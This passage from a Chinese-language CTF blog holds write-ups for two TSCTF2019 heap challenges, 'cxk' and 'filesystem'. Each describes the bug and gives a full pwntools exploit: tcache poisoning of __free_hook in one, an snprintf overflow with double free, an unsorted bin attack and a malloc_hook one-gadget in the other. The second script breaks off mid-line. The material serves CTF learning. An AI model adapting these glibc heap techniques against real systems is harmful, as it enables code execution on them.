<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先分配一些AV(0x30)和Letter(0x70)，再分配两个0x20的chunk并free(为之后的get shell准备)利用刚才strchr的漏洞将每个des_chunk的相邻letter_chunk的size改为0xa0(0x70+0x30，其下一个chunk的prev_in_use需要为1)，释放7个伪造的块，第8次释放的时候得到了unsorted bin里的chunk。</p>
<p>分配一个0x28大小的chunk，这时候先分配des_chunk后分配letter_chunk，des_chunk里的fd和bk都为main_arena+88，ShowLawyerLetter可以泄露libc。</p>
<p>现在注意我们刚刚释放了2个0x20大小的chunk，它们都进了tcache[0x20]。而我们刚刚通过Unsorted bin分配得到的那个0x28的块恰和0x1ddd4e0相邻，我们用strchr的漏洞多次edit即可修改其fd为我们的__free_hook，改为system_addr，最后释放一个’/bin/sh\x00’的块即可得到shell。</p>
<p><img src="/2020/09/03/tsctf2019/cxk/6.jpg" alt="attack"></p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./cxk'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'172.16.10.2'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InputName</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Please input your name:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'xmzyshypnc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddAv</span><span class="params">(av_number,des_size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input av number:'</span>)</span><br><span class="line">    p.sendline(str(av_number))</span><br><span class="line">    p.recvuntil(<span class="string">'Please input the size of description:'</span>)</span><br><span class="line">    p.sendline(str(des_size))</span><br><span class="line">    p.recvuntil(<span class="string">'Description:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SendLetter</span><span class="params">(av_number,reason_size,reason)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input av number:'</span>)</span><br><span class="line">    p.sendline(str(av_number))</span><br><span class="line">    p.recvuntil(<span class="string">'Please input the size of reason:'</span>)</span><br><span class="line">    p.sendline(str(reason_size))</span><br><span class="line">    p.recvuntil(<span class="string">'Reason:'</span>)</span><br><span class="line">    p.send(reason)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BeginCourtSession</span><span class="params">(av_number)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input av number:'</span>)</span><br><span class="line">    p.sendline(str(av_number))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EditStatement</span><span class="params">(av_number,old_chr,new_chr)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input the av_number for statement you want to change:'</span>)</span><br><span class="line">    p.sendline(str(av_number))</span><br><span class="line">    p.recvuntil(<span class="string">'Please input the old character:'</span>)</span><br><span class="line">    p.sendline(old_chr)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input the new character:'</span>)</span><br><span class="line">    p.sendline(new_chr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Revoke</span><span class="params">(av_number)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input the av_number for lawyer letter you want to revoke:'</span>)</span><br><span class="line">    p.sendline(str(av_number))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowLetter</span><span class="params">(av_number)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input the av_number for lawyer letter you want to see:'</span>)</span><br><span class="line">    p.sendline(str(av_number))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EditAv</span><span class="params">(av_number,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input av number:'</span>)</span><br><span class="line">    p.sendline(str(av_number))</span><br><span class="line">    p.recvuntil(<span class="string">'New Description:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DeleteAv</span><span class="params">(av_number)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input av number:'</span>)</span><br><span class="line">    p.sendline(str(av_number))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PlayAv</span><span class="params">(av_number)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please input av number:'</span>)</span><br><span class="line">    p.sendline(str(av_number))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    InputName()</span><br><span class="line">    malloc_num = <span class="number">36</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(malloc_num):</span><br><span class="line">        AddAv(i,<span class="number">20</span>,<span class="string">'a'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        SendLetter(i,<span class="number">68</span>,<span class="string">'a'</span>*<span class="number">0x67</span>+<span class="string">'\n'</span>)</span><br><span class="line">    SendLetter(<span class="number">8</span>,<span class="number">18</span>,<span class="string">'b\n'</span>)</span><br><span class="line">    SendLetter(<span class="number">9</span>,<span class="number">18</span>,<span class="string">'b\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        EditStatement(i,<span class="string">'\x00'</span>,<span class="string">'\x10'</span>)</span><br><span class="line">        EditStatement(i,<span class="string">'\x31'</span>,<span class="string">'\xa1'</span>)</span><br><span class="line">        Revoke(i)</span><br><span class="line">    Revoke(<span class="number">8</span>)</span><br><span class="line">    Revoke(<span class="number">9</span>)</span><br><span class="line">    EditStatement(<span class="number">7</span>,<span class="string">'\x00'</span>,<span class="string">'\x10'</span>)</span><br><span class="line">    EditStatement(<span class="number">7</span>,<span class="string">'\x31'</span>,<span class="string">'\xa1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Revoke(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get unsorted bin</span></span><br><span class="line">    SendLetter(<span class="number">10</span>,<span class="number">0x28</span>,<span class="string">'a'</span>*<span class="number">6</span>+<span class="string">'\n'</span>)<span class="comment">#overlapping chunk</span></span><br><span class="line">    ShowLetter(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'a'</span>*<span class="number">6</span>+<span class="string">'\x00\x00'</span>)</span><br><span class="line">    libc_base = u64(p.recvn(<span class="number">8</span>)) - <span class="number">224</span> - <span class="number">0x3ebc50</span></span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">    shell_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">        EditStatement(<span class="number">10</span>,<span class="string">'\x00'</span>,<span class="string">'\x31'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">        EditStatement(<span class="number">10</span>,<span class="string">'\x00'</span>,<span class="string">'\x01'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        EditStatement(<span class="number">10</span>,<span class="string">'\x00'</span>,p64(malloc_hook)[i])</span><br><span class="line">    <span class="comment">#set to null</span></span><br><span class="line">    <span class="comment">#for i in range(14):</span></span><br><span class="line">    <span class="comment">#    EditStatement(10,'\x01','\x00')</span></span><br><span class="line">    SendLetter(<span class="number">11</span>,<span class="number">18</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    SendLetter(<span class="number">12</span>,<span class="number">18</span>,<span class="string">'/bin/sh\x00\n'</span>)</span><br><span class="line"></span><br><span class="line">    SendLetter(<span class="number">13</span>,<span class="number">18</span>,p64(shell_addr)+<span class="string">'\n'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    Revoke(<span class="number">12</span>)</span><br><span class="line">    <span class="comment">#SendLetter(11,0x48,'a'*0x20+p64(0x18)+p64(0x21)+p64(fake_chunk)+'\n')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    for i in range(10,24):</span></span><br><span class="line"><span class="string">        #if i == 18</span></span><br><span class="line"><span class="string">        SendLetter(i,68,'a'*0x67+'\n')#10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    for i in range(10,17):</span></span><br><span class="line"><span class="string">        EditStatement(i,'\x00','\x10')</span></span><br><span class="line"><span class="string">        EditStatement(i,'\x31','\x41')</span></span><br><span class="line"><span class="string">        EditStatement(i,'\x00','\x01')</span></span><br><span class="line"><span class="string">        Revoke(i)</span></span><br><span class="line"><span class="string">    EditStatement(17,'\x00','\x10')</span></span><br><span class="line"><span class="string">    EditStatement(17,'\x31','\x41')</span></span><br><span class="line"><span class="string">    EditStatement(17,'\x00','\x01')</span></span><br><span class="line"><span class="string">    #Revoke(19)</span></span><br><span class="line"><span class="string">    #Revoke(18)</span></span><br><span class="line"><span class="string">    Revoke(17)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    gdb.attach(p)</span></span><br><span class="line"><span class="string">    SendLetter(24,130,'a\n')</span></span><br><span class="line"><span class="string">    SendLetter(25,130,'a\n')</span></span><br><span class="line"><span class="string">    #</span></span><br><span class="line"><span class="string">    SendLetter(26,100,'\x00'*0x20+p64(0x68)+p64(0x71)+p64(fake_chunk)+'\n')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    for i in range(25,32):</span></span><br><span class="line"><span class="string">        SendLetter(i,68,'a\n')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Revoke(25)</span></span><br><span class="line"><span class="string">    SendLetter(32,10,'a\n')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    SendLetter(33,60,'a\n')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    SendLetter(26,68,'a\n')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>TSCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>filesystem</title>
    <url>/2020/09/03/tsctf2019/filesystem/</url>
    <content><![CDATA[<h1 id="TSCTF2019-Final-fileSystem"><a href="#TSCTF2019-Final-fileSystem" class="headerlink" title="TSCTF2019 Final fileSystem"></a>TSCTF2019 Final fileSystem</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>填坑，当时做的时候卡在unsorted bin attack改掉限制</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>决赛的题最深的感触就是题目的代码量比平时见到的多，自己读代码能力太弱，这道题还稍微好点，以后遇到这种链表什么的最好动态地去看，直观一点。</p>
<p>程序的功能是可以创建文件夹，在文件夹的下面可以创建文件，看代码+动态调可以复原出几个比较重要的结构体。</p>
<p>dir为文件夹结构体，其中前0x20字节存储文件夹名，另一个成员存储文件夹中包含文件的最后一个(比如文件夹中包含文件0123，这个指针为file3的文件指针)，在0x603050处用mmap分配了一块地址，所有的文件夹结构体都存储在这个结构体中</p>
<p>file_chunk为文件结构体，前0x20字节存储文件名，0x30处存储content_size，0x38处存储同一个文件夹下的它的前一个文件指针(0123的话3的prev_file_chunk为2)，content_chunk存储文件内容。每次创建文件固定分配0x48为file_chunk，用户指定size分配content_chunk</p>
<p>delete_node为删除的文件临时存储的结构，每次删除文件都会分配这样一个结构体，把结构体存放在0x603058所在的map_addr+0x280中，每次要恢复的时候从刚释放的文件找起，遍delete_note获取要恢复的文件</p>
<p><img src="/2020/09/03/tsctf2019/filesystem/1.jpg" alt="struct"></p>
<p>程序的功能如下：</p>
<p><img src="/2020/09/03/tsctf2019/filesystem/2.jpg" alt="menu"></p>
<p>最开始有一个Init_set函数来mmap一个地址存储后面的各种结构体，用这样一个随机的地址可以避免unlink</p>
<p><img src="/2020/09/03/tsctf2019/filesystem/3.jpg" alt="init"></p>
<p>CreateDir函数最多可以创建16个文件夹，初始化其中的成员为0</p>
<p><img src="/2020/09/03/tsctf2019/filesystem/4.jpg" alt="createdir"></p>
<p>CreateFile函数创建文件，限制每个文件大小不大于0x9f。在使用snprintf的时候，存在漏洞，即输入file_name长度+格式化字符串长度超过0x30时，snprintf返回0x31，从而可以写content_size一个字节，进而在写content_chunk的时候产生溢出。</p>
<p><img src="/2020/09/03/tsctf2019/filesystem/5.jpg" alt="CraeteFile1"></p>
<p><img src="/2020/09/03/tsctf2019/filesystem/6.jpg" alt="CreateFile2"></p>
<p>ShowFile函数输出content_chunk的内容</p>
<p><img src="/2020/09/03/tsctf2019/filesystem/7.jpg" alt="ShowFile"></p>
<p>DeleteFile删除文件，放入delete_node中，free并没有清空文件内容</p>
<p><img src="/2020/09/03/tsctf2019/filesystem/8.jpg" alt="DeleteFile1"></p>
<p><img src="/2020/09/03/tsctf2019/filesystem/9.jpg" alt="DeleteFile2"></p>
<p>RecoverFile恢复文件，将deleted_node的节点加回到链表尾部</p>
<p><img src="/2020/09/03/tsctf2019/filesystem/10.jpg" alt="RecoverFile"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过上述分析，有两个漏洞，一个snprintf可以造成堆溢出，对于一个节点，Delete再Recover之后可以再Delete，为double free(因为Recover并没有重新malloc，而是把释放过的节点又连接到了链表尾部)。</p>
<p>我们首先分配一个0x90的块，按照上述方法，free-&gt;recover-&gt;show可以泄露libc。同理free两个fast bin大小的块再recover再show可以泄露heap_base。</p>
<p>分配一个0x38一个0x48的块(从第一个Unsorted bin分配)，释放它们让他们进入fast bin，分配一个0x90的块再释放(这个块在第一个Unsorted bin的下方)，得到unsorted bin，再分配一个content_chunk大小为0x38的块，用掉刚才的fast bin，用snprintf的漏洞，可以让这个content_chunk覆写到Unsorted bin，修改其bk = 0x603068-0x10，再分配0x90的块就可以让0x603068写入main_arena+88，但是这里有个坑，就是每次都是要先分配0x58大小的堆作为file_chunk，这里就从Unsorted bin里分配，我们知道Unsorted bin攻击之后就只能用fast bin或者small bin进行分配了，因此这里会出错。解决方案就是提前分配一堆0x48的块，释放进0x50的fast bin，从此CreateFile都从它们中取，同理，我们double free需要的file_chunk也要从它们取，另外还要提前布置好0x70的fast bin的环境，突破限制之后直接一顿分配即可。最后分配0x10的块，使用Unsorted bin报错从而调用Malloc_hook得到shell。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./filesystem'</span>)</span><br><span class="line">    offset = <span class="number">0x3c4b20</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'172.16.20.2'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateDir</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Give me the directory name: \n'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateFileN</span><span class="params">(dir_name,file_name,file_size,content, is_changed=<span class="string">'n'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'which directory do you want to put this file in: \n'</span>)</span><br><span class="line">    p.sendline(dir_name)</span><br><span class="line">    p.recvuntil(<span class="string">'Ok, plz input your filename(len&lt;=0x20): \n'</span>)</span><br><span class="line">    p.sendline(file_name)</span><br><span class="line">    p.recvuntil(<span class="string">'file size: \n'</span>)</span><br><span class="line">    p.sendline(str(file_size))</span><br><span class="line">    p.recvuntil(<span class="string">'changed!!\n'</span>)</span><br><span class="line">    p.sendline(is_changed)</span><br><span class="line">    p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateFileY</span><span class="params">(dir_name,file_name,file_size,new_file_name,content, is_changed=<span class="string">'Y'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'which directory do you want to put this file in: \n'</span>)</span><br><span class="line">    p.sendline(dir_name)</span><br><span class="line">    p.recvuntil(<span class="string">'Ok, plz input your filename(len&lt;=0x20): \n'</span>)</span><br><span class="line">    p.sendline(file_name)</span><br><span class="line">    p.recvuntil(<span class="string">'file size: \n'</span>)</span><br><span class="line">    p.sendline(str(file_size))</span><br><span class="line">    p.recvuntil(<span class="string">'changed!!\n'</span>)</span><br><span class="line">    p.sendline(is_changed)</span><br><span class="line">    p.recvuntil(<span class="string">'input your new file name: '</span>)</span><br><span class="line">    p.send(new_file_name)</span><br><span class="line">    p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowFile</span><span class="params">(dir_name,file_name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'input directory: \n'</span>)</span><br><span class="line">    p.sendline(dir_name)</span><br><span class="line">    p.recvuntil(<span class="string">'input filename: \n'</span>)</span><br><span class="line">    p.sendline(file_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DeleteFile</span><span class="params">(dir_name,file_name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'input directory: \n'</span>)</span><br><span class="line">    p.sendline(dir_name)</span><br><span class="line">    p.recvuntil(<span class="string">'input filename: \n'</span>)</span><br><span class="line">    p.sendline(file_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RecoverFile</span><span class="params">(dir_name,file_name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'6'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'input directory: \n'</span>)</span><br><span class="line">    p.sendline(dir_name)</span><br><span class="line">    p.recvuntil(<span class="string">'input filename: \n'</span>)</span><br><span class="line">    p.sendline(file_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    CreateDir(<span class="string">'1'</span>)</span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'a'</span>,<span class="number">0x88</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'c'</span>,<span class="number">0x88</span>,<span class="string">'a'</span>*<span class="number">0x17</span>)<span class="comment">#2</span></span><br><span class="line">    DeleteFile(<span class="string">'1'</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">    RecoverFile(<span class="string">'1'</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">    ShowFile(<span class="string">'1'</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'file content: '</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - offset</span><br><span class="line">    main_arena = libc_base + <span class="number">88</span> + offset</span><br><span class="line">    fake_chunk = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'e'</span>,<span class="number">0x38</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'f'</span>,<span class="number">0x48</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'g'</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x47</span>)<span class="comment">#6</span></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'h'</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x47</span>)<span class="comment">#7</span></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'i'</span>,<span class="number">0x48</span>,<span class="string">'a'</span>*<span class="number">0x47</span>)<span class="comment">#8</span></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'j'</span>,<span class="number">0x48</span>,<span class="string">'a'</span>*<span class="number">0x47</span>)<span class="comment">#9</span></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'k'</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x47</span>)<span class="comment">#10</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        CreateFileN(<span class="string">'1'</span>,str(i+<span class="number">5</span>),<span class="number">0x48</span>,<span class="string">'a'</span>)</span><br><span class="line">    DeleteFile(<span class="string">'1'</span>,<span class="string">'g'</span>)</span><br><span class="line">    DeleteFile(<span class="string">'1'</span>,<span class="string">'h'</span>)</span><br><span class="line">    RecoverFile(<span class="string">'1'</span>,<span class="string">'g'</span>)</span><br><span class="line">    ShowFile(<span class="string">'1'</span>,<span class="string">'g'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    p.recvuntil(<span class="string">'file content: '</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x2d0</span></span><br><span class="line">    log.success(<span class="string">"heap base =&gt; "</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#malloc preapare</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#double free</span></span><br><span class="line">    DeleteFile(<span class="string">'1'</span>,<span class="string">'i'</span>)</span><br><span class="line">    DeleteFile(<span class="string">'1'</span>,<span class="string">'j'</span>)</span><br><span class="line">    <span class="comment">#RecoverFile('1','i')</span></span><br><span class="line">    <span class="comment">#DeleteFile('1','i')</span></span><br><span class="line">    <span class="comment">#set fast bins to malloc</span></span><br><span class="line">    DeleteFile(<span class="string">'1'</span>,<span class="string">'e'</span>)</span><br><span class="line">    DeleteFile(<span class="string">'1'</span>,<span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DeleteFile(<span class="string">'1'</span>,<span class="string">'c'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#unsorted bin attack</span></span><br><span class="line">    <span class="comment">#payload = p64(0)+p64(main_arena)+'a'*0x28+p64(0x51)+p64(0x63)+'\x00'*0x28+p64(0x88)+p64(heap_base+0x1f0)</span></span><br><span class="line">    <span class="comment">#payload += p64(heap_base+0x160)+p64(0x91)+p64(0xdeadbeef)+p64(0x603058)</span></span><br><span class="line">    CreateFileY(<span class="string">'1'</span>,<span class="string">'a'</span>*<span class="number">0x1f</span>,<span class="number">0x38</span>,<span class="string">'a'</span>*<span class="number">0x30</span>+<span class="string">'\xf0'</span>,<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x603058</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'j'</span>,<span class="number">0x80</span>,<span class="string">'a'</span>)<span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        DeleteFile(<span class="string">'1'</span>,str(i+<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">    DeleteFile(<span class="string">'1'</span>,<span class="string">'g'</span>)</span><br><span class="line"></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span 